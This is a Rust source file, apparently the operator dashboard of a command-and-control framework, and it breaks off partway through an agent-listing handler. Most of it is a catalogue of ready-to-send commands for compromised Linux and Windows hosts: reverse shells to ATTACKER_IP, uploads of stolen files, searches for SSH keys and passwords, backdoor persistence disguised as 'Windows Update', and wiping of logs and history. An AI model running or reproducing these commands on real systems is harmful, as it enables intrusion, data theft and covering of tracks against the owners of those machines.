use askama::Template;
use axum::{
    extract::{Form, Path},
    response::{Html, IntoResponse, Redirect},
    routing::{get, post},
    Router,
};
use chrono::{DateTime, Duration, Utc};
use protocol::*;
use serde::{Deserialize, Serialize};
use std::net::SocketAddr;
use uuid::Uuid;
use std::env;

fn get_c2_server_url() -> String {
    env::var("C2_SERVER")
        .unwrap_or_else(|_| "http://127.0.0.1:8080".to_string())
}

#[derive(Clone, Serialize)]
struct PredefinedCommand {
    name: String,
    command: String,
    description: String,
    category: String,
    os: String,
}

fn get_predefined_commands() -> Vec<PredefinedCommand> {
    vec![
        // ===== REVERSE SHELLS - LINUX =====
        PredefinedCommand {
            name: "Bash Reverse Shell".to_string(),
            command: "bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1\"".to_string(),
            description: "Opens a reverse shell connection using bash".to_string(),
            category: "shell".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Python Reverse Shell".to_string(),
            command: "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\"".to_string(),
            description: "Opens a reverse shell connection using Python".to_string(),
            category: "shell".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Netcat Reverse Shell".to_string(),
            command: "nc ATTACKER_IP ATTACKER_PORT -e /bin/bash".to_string(),
            description: "Opens a reverse shell connection using netcat".to_string(),
            category: "shell".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "PHP Reverse Shell".to_string(),
            command: "php -r '$sock=fsockopen(\"ATTACKER_IP\",ATTACKER_PORT);exec(\"/bin/bash -i <&3 >&3 2>&3\");'".to_string(),
            description: "PHP reverse shell one-liner".to_string(),
            category: "shell".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Perl Reverse Shell".to_string(),
            command: "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'".to_string(),
            description: "Perl reverse shell one-liner".to_string(),
            category: "shell".to_string(),
            os: "Linux".to_string(),
        },
        
        // ===== REVERSE SHELLS - WINDOWS =====
        PredefinedCommand {
            name: "PowerShell Reverse Shell".to_string(),
            command: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"".to_string(),
            description: "Opens a reverse shell connection using PowerShell".to_string(),
            category: "shell".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "PowerShell One-Liner Shell".to_string(),
            command: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()".to_string(),
            description: "PowerShell reverse shell (shorter version)".to_string(),
            category: "shell".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Python Reverse Shell (Win)".to_string(),
            command: "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn('cmd.exe')\"".to_string(),
            description: "Opens a reverse shell using Python on Windows".to_string(),
            category: "shell".to_string(),
            os: "Windows".to_string(),
        },
        
        // ===== RECONNAISSANCE - LINUX =====
        PredefinedCommand {
            name: "Full System Info".to_string(),
            command: "uname -a && cat /etc/*release && whoami && id && hostname && uptime".to_string(),
            description: "Complete system information dump".to_string(),
            category: "recon".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Network Configuration".to_string(),
            command: "ip a && ip route && cat /etc/resolv.conf && arp -a".to_string(),
            description: "Full network configuration and routing".to_string(),
            category: "recon".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Listening Services".to_string(),
            command: "netstat -tulpn 2>/dev/null || ss -tulpn".to_string(),
            description: "Shows all listening network services".to_string(),
            category: "recon".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Process List".to_string(),
            command: "ps aux".to_string(),
            description: "Lists all running processes".to_string(),
            category: "recon".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "List Users".to_string(),
            command: "cat /etc/passwd | cut -d: -f1 && who && w".to_string(),
            description: "Lists all system users and logged in users".to_string(),
            category: "recon".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Environment Variables".to_string(),
            command: "env && printenv".to_string(),
            description: "Display all environment variables".to_string(),
            category: "recon".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Disk Usage".to_string(),
            command: "df -h && lsblk".to_string(),
            description: "Show disk usage and block devices".to_string(),
            category: "recon".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Find SSH Keys".to_string(),
            command: "find / -name id_rsa -o -name id_dsa -o -name id_ed25519 -o -name authorized_keys 2>/dev/null".to_string(),
            description: "Searches for SSH private keys and authorized_keys files".to_string(),
            category: "recon".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Check Firewall Rules".to_string(),
            command: "iptables -L -n -v 2>/dev/null || ufw status verbose 2>/dev/null || firewall-cmd --list-all 2>/dev/null".to_string(),
            description: "Display firewall rules".to_string(),
            category: "recon".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Find Writable Directories".to_string(),
            command: "find / -type d -writable 2>/dev/null | head -50".to_string(),
            description: "Find directories writable by current user".to_string(),
            category: "recon".to_string(),
            os: "Linux".to_string(),
        },
        
        // ===== RECONNAISSANCE - WINDOWS =====
        PredefinedCommand {
            name: "Full System Info".to_string(),
            command: "systeminfo && whoami && hostname".to_string(),
            description: "Complete system information dump".to_string(),
            category: "recon".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Network Configuration".to_string(),
            command: "ipconfig /all && route print && arp -a".to_string(),
            description: "Full network configuration and routing".to_string(),
            category: "recon".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Listening Services".to_string(),
            command: "netstat -ano".to_string(),
            description: "Shows all listening network services".to_string(),
            category: "recon".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Process List".to_string(),
            command: "tasklist /v".to_string(),
            description: "Lists all running processes".to_string(),
            category: "recon".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "List Users".to_string(),
            command: "net user && query user".to_string(),
            description: "Lists all system users and logged in users".to_string(),
            category: "recon".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Environment Variables".to_string(),
            command: "set".to_string(),
            description: "Display all environment variables".to_string(),
            category: "recon".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Disk Usage".to_string(),
            command: "wmic logicaldisk get caption,description,freespace,size".to_string(),
            description: "Show disk usage information".to_string(),
            category: "recon".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Check Firewall Rules".to_string(),
            command: "netsh advfirewall show allprofiles".to_string(),
            description: "Display firewall status and rules".to_string(),
            category: "recon".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "List Installed Software".to_string(),
            command: "wmic product get name,version".to_string(),
            description: "List all installed software".to_string(),
            category: "recon".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Check Antivirus".to_string(),
            command: "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname,productstate".to_string(),
            description: "Check installed antivirus software".to_string(),
            category: "recon".to_string(),
            os: "Windows".to_string(),
        },
        
        // ===== PRIVILEGE ESCALATION - LINUX =====
        PredefinedCommand {
            name: "Find SUID Binaries".to_string(),
            command: "find / -perm -4000 -type f 2>/dev/null".to_string(),
            description: "Finds all SUID binaries for privilege escalation".to_string(),
            category: "privesc".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Find SGID Binaries".to_string(),
            command: "find / -perm -2000 -type f 2>/dev/null".to_string(),
            description: "Finds all SGID binaries".to_string(),
            category: "privesc".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Check Sudo Rights".to_string(),
            command: "sudo -n -l 2>&1".to_string(),
            description: "Lists sudo privileges without password prompt".to_string(),
            category: "privesc".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Check for Docker".to_string(),
            command: "docker ps 2>/dev/null && groups | grep docker".to_string(),
            description: "Check if user can access Docker".to_string(),
            category: "privesc".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Kernel Exploits Check".to_string(),
            command: "uname -r && cat /proc/version && dmesg | grep -i exploit".to_string(),
            description: "Check kernel version for known exploits".to_string(),
            category: "privesc".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Capabilities Check".to_string(),
            command: "getcap -r / 2>/dev/null".to_string(),
            description: "Find files with capabilities set".to_string(),
            category: "privesc".to_string(),
            os: "Linux".to_string(),
        },
        
        // ===== PRIVILEGE ESCALATION - WINDOWS =====
        PredefinedCommand {
            name: "Check User Privileges".to_string(),
            command: "whoami /priv".to_string(),
            description: "Display user privileges".to_string(),
            category: "privesc".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Check Group Membership".to_string(),
            command: "whoami /groups".to_string(),
            description: "Display user group memberships".to_string(),
            category: "privesc".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "List Scheduled Tasks".to_string(),
            command: "schtasks /query /fo LIST /v".to_string(),
            description: "List all scheduled tasks".to_string(),
            category: "privesc".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Check Unquoted Service Paths".to_string(),
            command: "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\\\"\"".to_string(),
            description: "Find services with unquoted paths".to_string(),
            category: "privesc".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Check AlwaysInstallElevated".to_string(),
            command: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated".to_string(),
            description: "Check if AlwaysInstallElevated is enabled".to_string(),
            category: "privesc".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Find Writeable Services".to_string(),
            command: "powershell -c \"Get-Service | ForEach-Object { $serviceName = $_.Name; $acl = (Get-Acl \\\"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$serviceName\\\").Access | Where-Object {$_.IdentityReference -match 'Users' -or $_.IdentityReference -match 'Everyone'}; if ($acl) { Write-Host \\\"Writable: $serviceName\\\" } }\"".to_string(),
            description: "Find services writable by current user".to_string(),
            category: "privesc".to_string(),
            os: "Windows".to_string(),
        },
        
        // ===== FILE OPERATIONS - LINUX =====
        PredefinedCommand {
            name: "Download File (wget)".to_string(),
            command: "wget -O /tmp/file.txt http://ATTACKER_IP/file.txt".to_string(),
            description: "Downloads a file using wget".to_string(),
            category: "file".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Download File (curl)".to_string(),
            command: "curl -o /tmp/file.txt http://ATTACKER_IP/file.txt".to_string(),
            description: "Downloads a file using curl".to_string(),
            category: "file".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Upload File (curl)".to_string(),
            command: "curl -X POST -F 'file=@/path/to/file' http://ATTACKER_IP/upload".to_string(),
            description: "Upload file to attacker server".to_string(),
            category: "file".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Exfiltrate File (Base64)".to_string(),
            command: "cat /path/to/file | base64 | tr -d '\\n'".to_string(),
            description: "Encodes file in base64 for exfiltration".to_string(),
            category: "file".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Search for Passwords".to_string(),
            command: "grep -ri 'password' /home /var/www /etc 2>/dev/null | head -100".to_string(),
            description: "Search for password strings in files".to_string(),
            category: "file".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Find Config Files".to_string(),
            command: "find / -name '*.conf' -o -name '*.config' -o -name '*.ini' 2>/dev/null | head -100".to_string(),
            description: "Find configuration files".to_string(),
            category: "file".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Find Database Files".to_string(),
            command: "find / -name '*.db' -o -name '*.sql' -o -name '*.sqlite' 2>/dev/null".to_string(),
            description: "Find database files".to_string(),
            category: "file".to_string(),
            os: "Linux".to_string(),
        },
        
        // ===== FILE OPERATIONS - WINDOWS =====
        PredefinedCommand {
            name: "Download File (PowerShell)".to_string(),
            command: "powershell -c \"Invoke-WebRequest -Uri 'http://ATTACKER_IP/file.txt' -OutFile 'C:\\Temp\\file.txt'\"".to_string(),
            description: "Downloads a file using PowerShell".to_string(),
            category: "file".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Download File (certutil)".to_string(),
            command: "certutil -urlcache -split -f http://ATTACKER_IP/file.txt C:\\Temp\\file.txt".to_string(),
            description: "Downloads a file using certutil".to_string(),
            category: "file".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Upload File (PowerShell)".to_string(),
            command: "powershell -c \"Invoke-RestMethod -Uri 'http://ATTACKER_IP/upload' -Method Post -InFile 'C:\\path\\to\\file'\"".to_string(),
            description: "Upload file to attacker server".to_string(),
            category: "file".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Exfiltrate File (Base64)".to_string(),
            command: "powershell -c \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\path\\to\\file'))\"".to_string(),
            description: "Encodes file in base64 for exfiltration".to_string(),
            category: "file".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Search for Passwords".to_string(),
            command: "findstr /si password *.txt *.xml *.ini *.config".to_string(),
            description: "Search for password strings in files".to_string(),
            category: "file".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Find Config Files".to_string(),
            command: "dir /s /b *.config *.ini *.xml".to_string(),
            description: "Find configuration files".to_string(),
            category: "file".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Find Database Files".to_string(),
            command: "dir /s /b *.db *.mdb *.accdb *.sql".to_string(),
            description: "Find database files".to_string(),
            category: "file".to_string(),
            os: "Windows".to_string(),
        },
        
        // ===== PERSISTENCE - LINUX =====
        PredefinedCommand {
            name: "Check Cron Jobs".to_string(),
            command: "cat /etc/crontab && ls -la /etc/cron.* && crontab -l 2>/dev/null".to_string(),
            description: "Lists all cron jobs".to_string(),
            category: "persist".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Add Cron Persistence".to_string(),
            command: "echo \"*/5 * * * * /tmp/backdoor.sh\" | crontab -".to_string(),
            description: "Adds a cron job that runs every 5 minutes".to_string(),
            category: "persist".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Check Systemd Services".to_string(),
            command: "systemctl list-units --type=service --state=running".to_string(),
            description: "List all running systemd services".to_string(),
            category: "persist".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Check RC Scripts".to_string(),
            command: "ls -la /etc/rc*.d/ /etc/init.d/".to_string(),
            description: "Check startup scripts".to_string(),
            category: "persist".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Add SSH Key".to_string(),
            command: "mkdir -p ~/.ssh && echo 'YOUR_SSH_KEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys".to_string(),
            description: "Add SSH public key for persistence".to_string(),
            category: "persist".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Check Bash History".to_string(),
            command: "cat ~/.bash_history && cat /root/.bash_history 2>/dev/null".to_string(),
            description: "View bash command history".to_string(),
            category: "persist".to_string(),
            os: "Linux".to_string(),
        },
        
        // ===== PERSISTENCE - WINDOWS =====
        PredefinedCommand {
            name: "Add Registry Run Key".to_string(),
            command: "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /t REG_SZ /d \"C:\\Temp\\backdoor.exe\" /f".to_string(),
            description: "Add persistence via registry run key".to_string(),
            category: "persist".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Create Scheduled Task".to_string(),
            command: "schtasks /create /tn \"Windows Update\" /tr \"C:\\Temp\\backdoor.exe\" /sc minute /mo 5 /f".to_string(),
            description: "Create scheduled task running every 5 minutes".to_string(),
            category: "persist".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Check Startup Folder".to_string(),
            command: "dir \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".to_string(),
            description: "List items in startup folder".to_string(),
            category: "persist".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Add Startup Item".to_string(),
            command: "copy C:\\Temp\\backdoor.exe \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"".to_string(),
            description: "Add file to startup folder".to_string(),
            category: "persist".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Check PowerShell History".to_string(),
            command: "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt".to_string(),
            description: "View PowerShell command history".to_string(),
            category: "persist".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "List Services".to_string(),
            command: "sc query state= all".to_string(),
            description: "List all Windows services".to_string(),
            category: "persist".to_string(),
            os: "Windows".to_string(),
        },
        
        // ===== LATERAL MOVEMENT - LINUX =====
        PredefinedCommand {
            name: "Ping Sweep".to_string(),
            command: "for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i 2>/dev/null && echo \"192.168.1.$i is up\"; done".to_string(),
            description: "Scan network for live hosts".to_string(),
            category: "lateral".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Port Scan Common".to_string(),
            command: "for port in 21 22 23 25 80 443 3306 3389 5432 8080; do timeout 1 bash -c \"echo >/dev/tcp/TARGET_IP/$port\" 2>/dev/null && echo \"Port $port open\"; done".to_string(),
            description: "Scan common ports on target".to_string(),
            category: "lateral".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Check Network Shares".to_string(),
            command: "mount | grep -i nfs && mount | grep -i cifs && df -h | grep -E 'nfs|cifs'".to_string(),
            description: "List mounted network shares".to_string(),
            category: "lateral".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Find SSH Config".to_string(),
            command: "cat ~/.ssh/config 2>/dev/null && cat ~/.ssh/known_hosts 2>/dev/null".to_string(),
            description: "View SSH configuration and known hosts".to_string(),
            category: "lateral".to_string(),
            os: "Linux".to_string(),
        },
        
        // ===== LATERAL MOVEMENT - WINDOWS =====
        PredefinedCommand {
            name: "Ping Sweep".to_string(),
            command: "for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find \"Reply\" && echo 192.168.1.%i is up".to_string(),
            description: "Scan network for live hosts".to_string(),
            category: "lateral".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "List Network Shares".to_string(),
            command: "net view \\\\TARGET_IP && net share".to_string(),
            description: "List network shares on target".to_string(),
            category: "lateral".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "List Domain Computers".to_string(),
            command: "net view /domain && net group \"Domain Computers\" /domain".to_string(),
            description: "List computers in the domain".to_string(),
            category: "lateral".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "List Domain Users".to_string(),
            command: "net user /domain && net group \"Domain Admins\" /domain".to_string(),
            description: "List domain users and admins".to_string(),
            category: "lateral".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Check RDP Sessions".to_string(),
            command: "qwinsta".to_string(),
            description: "List active RDP sessions".to_string(),
            category: "lateral".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "List Mapped Drives".to_string(),
            command: "net use".to_string(),
            description: "List all mapped network drives".to_string(),
            category: "lateral".to_string(),
            os: "Windows".to_string(),
        },
        
        // ===== CLEANUP - LINUX =====
        PredefinedCommand {
            name: "Clear Bash History".to_string(),
            command: "cat /dev/null > ~/.bash_history && history -c".to_string(),
            description: "Clear command history".to_string(),
            category: "cleanup".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Clear Logs".to_string(),
            command: "echo '' > /var/log/auth.log 2>/dev/null && echo '' > /var/log/syslog 2>/dev/null".to_string(),
            description: "Clear system logs (requires root)".to_string(),
            category: "cleanup".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Remove Files".to_string(),
            command: "rm -f /tmp/backdoor.sh /tmp/*.txt /tmp/*.elf 2>/dev/null".to_string(),
            description: "Remove common temporary files".to_string(),
            category: "cleanup".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Disable History".to_string(),
            command: "unset HISTFILE && export HISTSIZE=0".to_string(),
            description: "Disable command history for current session".to_string(),
            category: "cleanup".to_string(),
            os: "Linux".to_string(),
        },
        
        // ===== CLEANUP - WINDOWS =====
        PredefinedCommand {
            name: "Clear PowerShell History".to_string(),
            command: "Remove-Item (Get-PSReadlineOption).HistorySavePath".to_string(),
            description: "Clear PowerShell command history".to_string(),
            category: "cleanup".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Clear Event Logs".to_string(),
            command: "wevtutil cl System && wevtutil cl Security && wevtutil cl Application".to_string(),
            description: "Clear Windows event logs (requires admin)".to_string(),
            category: "cleanup".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Remove Files".to_string(),
            command: "del /f /q C:\\Temp\\backdoor.exe C:\\Temp\\*.txt".to_string(),
            description: "Remove common temporary files".to_string(),
            category: "cleanup".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Remove Registry Key".to_string(),
            command: "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /f".to_string(),
            description: "Remove persistence registry key".to_string(),
            category: "cleanup".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Delete Scheduled Task".to_string(),
            command: "schtasks /delete /tn \"Windows Update\" /f".to_string(),
            description: "Remove scheduled task".to_string(),
            category: "cleanup".to_string(),
            os: "Windows".to_string(),
        },
        
        // ===== AGENT CONTROL - BOTH =====
        PredefinedCommand {
            name: "Sleep 30 seconds".to_string(),
            command: "sleep 30".to_string(),
            description: "Agent sleeps for 30 seconds".to_string(),
            category: "control".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Sleep 5 minutes".to_string(),
            command: "sleep 300".to_string(),
            description: "Agent sleeps for 5 minutes".to_string(),
            category: "control".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Change Directory".to_string(),
            command: "cd /tmp && pwd".to_string(),
            description: "Change working directory".to_string(),
            category: "control".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Test Connection".to_string(),
            command: "echo 'Agent is alive' && date".to_string(),
            description: "Simple connectivity test".to_string(),
            category: "control".to_string(),
            os: "Linux".to_string(),
        },
        PredefinedCommand {
            name: "Sleep 30 seconds".to_string(),
            command: "timeout /t 30".to_string(),
            description: "Agent sleeps for 30 seconds".to_string(),
            category: "control".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Sleep 5 minutes".to_string(),
            command: "timeout /t 300".to_string(),
            description: "Agent sleeps for 5 minutes".to_string(),
            category: "control".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Change Directory".to_string(),
            command: "cd C:\\Temp && cd".to_string(),
            description: "Change working directory".to_string(),
            category: "control".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Test Connection".to_string(),
            command: "echo Agent is alive && echo %date% %time%".to_string(),
            description: "Simple connectivity test".to_string(),
            category: "control".to_string(),
            os: "Windows".to_string(),
        },
        
        // ===== PROTOCOLS (School Mode) - WINDOWS ONLY =====
        PredefinedCommand {
            name: "Quiz Mode".to_string(),
            command: "PROTOCOL:QUIZ_MODE|https://example.com".to_string(),
            description: "Lock browser to specific URL".to_string(),
            category: "protocol".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Block All DNS".to_string(),
            command: "PROTOCOL:BLOCK_DNS".to_string(),
            description: "Block all DNS resolution".to_string(),
            category: "protocol".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "DNS Whitelist".to_string(),
            command: "PROTOCOL:BLOCK_DNS_WHITELIST|example.com|google.com".to_string(),
            description: "Allow only whitelisted domains".to_string(),
            category: "protocol".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Lock Screen".to_string(),
            command: "PROTOCOL:LOCK_SCREEN".to_string(),
            description: "Lock the workstation".to_string(),
            category: "protocol".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Disable Task Manager".to_string(),
            command: "PROTOCOL:DISABLE_TASK_MANAGER".to_string(),
            description: "Disable Windows Task Manager".to_string(),
            category: "protocol".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Enable Task Manager".to_string(),
            command: "PROTOCOL:ENABLE_TASK_MANAGER".to_string(),
            description: "Re-enable Windows Task Manager".to_string(),
            category: "protocol".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Get File".to_string(),
            command: "PROTOCOL:GET_FILE|C:\\path\\to\\file.txt".to_string(),
            description: "Download file from agent".to_string(),
            category: "protocol".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Upload File".to_string(),
            command: "PROTOCOL:UPLOAD_FILE|C:\\path\\to\\file.txt|BASE64_CONTENT_HERE".to_string(),
            description: "Upload file to agent".to_string(),
            category: "protocol".to_string(),
            os: "Windows".to_string(),
        },
        PredefinedCommand {
            name: "Revert All Changes".to_string(),
            command: "PROTOCOL:REVERT_ALL".to_string(),
            description: "Restore all original settings".to_string(),
            category: "protocol".to_string(),
            os: "Windows".to_string(),
        },
    ]
}

#[derive(Clone, Serialize)]
struct AgentViewModel {
    id: String,
    hostname: String,
    os: String,
    os_version: String,
    ip: String,
    mac: String,
    username: String,
    last_seen_formatted: String,
    registered_at_formatted: String,
    status: String,
    status_class: String,
}

#[derive(Clone, Serialize)]
struct TaskViewModel {
    task_id: String,
    command: String,
    created_at_formatted: String,
    completed_at_formatted: String,
    output: String,
    exit_code: Option<i32>,
    status: String,
    status_class: String,
    output_class: String,
    has_output: bool,
}

#[derive(Template)]
#[template(path = "index.html")]
struct IndexTemplate {
    agents: Vec<AgentViewModel>,
    online_count: usize,
}

#[derive(Template)]
#[template(path = "agent.html")]
struct AgentTemplate {
    agent: AgentViewModel,
    tasks: Vec<TaskViewModel>,
    predefined_commands: Vec<PredefinedCommand>,
}

#[derive(Deserialize)]
struct TaskForm {
    command: String,
}

fn format_datetime(dt: &str) -> String {
    if let Ok(parsed) = DateTime::parse_from_rfc3339(dt) {
        let now = Utc::now();
        let duration = now.signed_duration_since(parsed.with_timezone(&Utc));
        
        if duration < Duration::seconds(60) {
            format!("{} seconds ago", duration.num_seconds())
        } else if duration < Duration::hours(1) {
            format!("{} minutes ago", duration.num_minutes())
        } else if duration < Duration::days(1) {
            format!("{} hours ago", duration.num_hours())
        } else {
            format!("{} days ago", duration.num_days())
        }
    } else {
        dt.to_string()
    }
}

fn is_agent_online(last_seen: &str) -> bool {
    if let Ok(parsed) = DateTime::parse_from_rfc3339(last_seen) {
        let now = Utc::now();
        let duration = now.signed_duration_since(parsed.with_timezone(&Utc));
        duration < Duration::seconds(30)
    } else {
        false
    }
}

async fn index() -> Result<Html<String>, String> {
    let c2_server_url = get_c2_server_url();
    let client = reqwest::Client::new();
    let response = client
        .get(format!("{}/agents", c2_server_url))
        .send()
        .await
        .map_err(|e| format!("Failed to fetch agents: {}", e))?;

    if !response.status().is_success() {
        return Err(format!("Server returned error: {}", response.status()));
    }

